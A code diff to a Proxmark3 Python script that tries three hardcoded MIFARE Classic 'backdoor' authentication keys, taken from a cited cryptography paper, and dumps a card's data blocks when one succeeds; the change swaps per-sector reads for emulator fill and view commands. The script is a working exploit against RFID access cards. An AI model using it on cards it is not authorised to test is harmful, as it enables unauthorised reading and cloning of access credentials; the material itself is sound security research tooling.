@@ -5,12 +5,9 @@
 # Based on the work in this paper: https://eprint.iacr.org/2024/1275
 
 import pm3
-import os
 import sys
 
-TOTAL_SECTORS = 16 #1k chips
-
-BACKDOOR_KEYS = ["A396EFA4E24F", "A31667A8CEC1", "518B3354E760"]
+BACKDOOR_KEYS = [("A396EFA4E24F", "1k"), ("A31667A8CEC1", "1k"), ("518B3354E760", "4k")]
 WORKING_KEY = None
 
 required_version = (3, 8)
@@ -21,50 +18,27 @@ if sys.version_info < required_version:
 p = pm3.pm3()
 
 # Test all the keys first to see which one works (if any)
-for bk in BACKDOOR_KEYS:
-    p.console(f"hf mf rdbl -c 4 --blk 0 --key {bk}")
+for bk, sz in BACKDOOR_KEYS:
+    p.console(f"hf mf ecfill --{sz} -c 4 -k {bk}")
     output = p.grabbed_output.split('\n')
 
-    if "auth error" in output[0].lower():
+    if "[#] Card not found" in output:
+        print("Error reading the tag:")
+        print("\n".join(output))
+        break
+    elif "[-]  Fill ( fail )" in output:
         continue
-    elif "can't select card" in output[0].lower():
-        print(f"Error reading the tag: {output[0]}")
-        exit()
-    elif len(output) < 2 or "sector 0" not in output[1].lower():
+    elif "[+] Fill ( ok )" not in output:
         print("Unexpected output, exiting:")
         print("\n".join(output))
-        exit()
+        break
     else:
         WORKING_KEY = bk
         break
 
-if not WORKING_KEY:
+if WORKING_KEY is None:
     print("None of the backdoor keys seem to work with this tag.")
-    exit()
-
-print(f"Backdoor key {WORKING_KEY} seems to work, dumping data...")
-if WORKING_KEY == "518B3354E760":
-    print(f"Backdoor key is for a 4k chip, will attempt to dump 64 sectors instead of {TOTAL_SECTORS}")
-    TOTAL_SECTORS = 64
-print("IMPORTANT: Only data blocks and access bytes can be dumped; keys will be shown as all 0's")
-
-header = False
-# Read every sector
-for i in range(TOTAL_SECTORS):
-    p.console(f"hf mf rdsc -c 4 --key {WORKING_KEY} -s {i}")
-
-    start = False
-    for line in p.grabbed_output.split('\n'):
-        if not header:
-            print(line)
-        elif start and len(line) > 0:
-            print(line)
-            continue
-
-        if "----------" in line:
-            start = True
-            header = True
-            continue
-        else:
-            continue
-
+else:
+    print(f"Backdoor key {WORKING_KEY} seems to work, dumping data...")
+    print("IMPORTANT: Only data blocks and access bytes can be dumped; keys will be shown as all 0's")
+    p.console(f"hf mf eview --{sz}", True)
